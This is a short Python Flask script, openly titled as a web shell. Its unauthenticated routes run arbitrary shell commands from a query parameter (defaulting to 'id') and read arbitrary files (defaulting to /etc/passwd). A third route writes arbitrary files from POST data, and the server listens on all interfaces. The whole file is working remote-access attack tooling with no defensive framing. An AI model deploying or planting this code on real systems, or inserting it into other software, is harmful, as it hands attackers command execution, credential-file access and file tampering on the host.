#!/usr/bin/env python3
"""Simple Python web shell — Flask-based."""
from flask import Flask, request
import subprocess, os

app = Flask(__name__)

@app.route('/shell')
def shell():
    cmd = request.args.get('cmd', 'id')
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
        return f"<pre>{out.decode()}</pre>"
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/read')
def read():
    path = request.args.get('file', '/etc/passwd')
    try:
        with open(path, 'r') as f:
            return f"<pre>{f.read()}</pre>"
    except Exception as e:
        return str(e), 500

@app.route('/write', methods=['POST'])
def write():
    path = request.args.get('file')
    data = request.get_data(as_text=True)
    try:
        with open(path, 'w') as f:
            f.write(data)
        return "OK"
    except Exception as e:
        return str(e), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
